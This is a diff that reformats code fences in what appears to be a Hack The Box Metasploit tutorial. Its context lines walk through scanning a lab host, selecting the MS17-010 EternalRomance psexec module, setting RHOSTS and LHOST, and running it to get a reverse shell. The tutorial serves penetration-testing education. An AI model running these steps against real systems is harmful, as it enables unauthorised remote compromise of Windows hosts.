@@ -8,15 +8,13 @@ Once we are in the `msfconsole`, we can select from an extensive list containing
 
 #### Syntax
 
-```
-        shellsession
+```shellsession
 <No.> <type>/<os>/<service>/<name>
 ```
 
 #### Example
 
-```
-        shellsession
+```shellsession
 794   exploit/windows/ftp/scriptftp_list
 ```
 
@@ -66,8 +64,7 @@ Metasploit also offers a well-developed search function for the existing modules
 
 #### MSF - Search Function
 
-```
-        shellsession
+```shellsession
 msf6 > help search
 
 Usage: search [<options>] [<keywords>:<value>]
@@ -126,8 +123,7 @@ For example, we can try to find the `EternalRomance` exploit for older Windows o
 
 #### MSF - Searching for EternalRomance
 
-```
-        shellsession
+```shellsession
 msf6 > search eternalromance
 
 Matching Modules
@@ -152,8 +148,7 @@ We can also make our search a bit more coarse and reduce it to one category of s
 
 #### MSF - Specific Search
 
-```
-        shellsession
+```shellsession
 msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
 
 Matching Modules
@@ -172,8 +167,7 @@ Matching Modules
 
 To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17\_010) exploits. We have found that SMB server port 445 is open upon scanning the target.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -sV 10.10.10.40
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
@@ -201,8 +195,7 @@ We would boot up `msfconsole` and search for this exact exploit name.
 
 #### MSF - Search for MS17\_010
 
-```
-        shellsession
+```shellsession
 msf6 > search ms17_010
 
 Matching Modules
@@ -226,8 +219,7 @@ Within the interactive modules, there are several options that we can specify. T
 
 #### MSF - Select Module
 
-```
-        shellsession
+```shellsession
 
 <SNIP>
 
@@ -283,8 +275,7 @@ Here we see how helpful the `No.` tags can be. Because now, we do not have to ty
 
 #### MSF - Module Information
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > info
 
        Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
@@ -367,8 +358,7 @@ After we are satisfied that the selected module is the right one for our purpose
 
 #### MSF - Target Specification
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
 
 RHOSTS => 10.10.10.40
@@ -413,8 +403,7 @@ In addition, there is the option `setg`, which specifies options selected by us 
 
 #### MSF - Permanent Target Specification
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
 
 RHOSTS => 10.10.10.40
@@ -459,8 +448,7 @@ Finally, since we are about to use a TCP-based reverse shell (`/windows/meterpre
 
 #### MSF - LHOST Specification
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
 
 LHOSTS => 10.10.14.15
@@ -505,8 +493,7 @@ Once everything is set and ready to go, we can proceed to launch the attack. Not
 
 #### MSF - Exploit Execution
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > run
 
 [*] Started reverse TCP handler on 10.10.14.15:4444 
@@ -546,8 +533,7 @@ We now have a shell on the target machine, and we can interact with it.
 
 #### MSF - Target Interaction
 
-```
-        shellsession
+```shellsession
 C:\Windows\system32> whoami
 
 whoami
